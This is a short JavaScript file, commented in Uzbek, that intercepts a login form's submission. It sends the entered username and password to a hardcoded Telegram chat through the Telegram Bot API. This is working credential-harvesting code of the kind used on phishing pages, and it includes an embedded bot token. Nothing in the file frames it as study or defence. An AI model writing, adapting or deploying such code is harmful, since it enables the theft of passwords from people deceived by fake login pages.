document.getElementById('login-post').addEventListener('submit', function (event) {
    event.preventDefault(); // Formni yuborishni to'xtatadi

    const username = document.getElementById('username').value; // Username qiymati
    const password = document.getElementById('password').value; // Password qiymati

    // Telegram bot ma'lumotlari
    const botToken = "7523998498:AAFz99R8wwqPYB_axDa0We8iLEHtUgB2r5c"; // Bot tokeningizni bu yerga kiriting
    const chatId = "6318323960";    // Chat ID ni bu yerga kiriting

    // Foydalanuvchi kiritgan ma'lumotlarni xabar sifatida yuborish
    const message = `🔐 Login ma'lumotlari:\n👤 Username: ${username}\n🔑 Password: ${password}`;

    // Telegram API orqali xabar yuborish
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
        }),
    })
    .then(response => {
        if (response.ok) {
            alert("Ma'lumot yuborildi!"); // Yuborildi
        } else {
            alert("Xatolik yuz berdi!"); // Xatolik
        }
    })
    .catch(error => {
        console.error("Error:", error);
        alert("Xabarni yuborishda xatolik yuz berdi!");
    });
});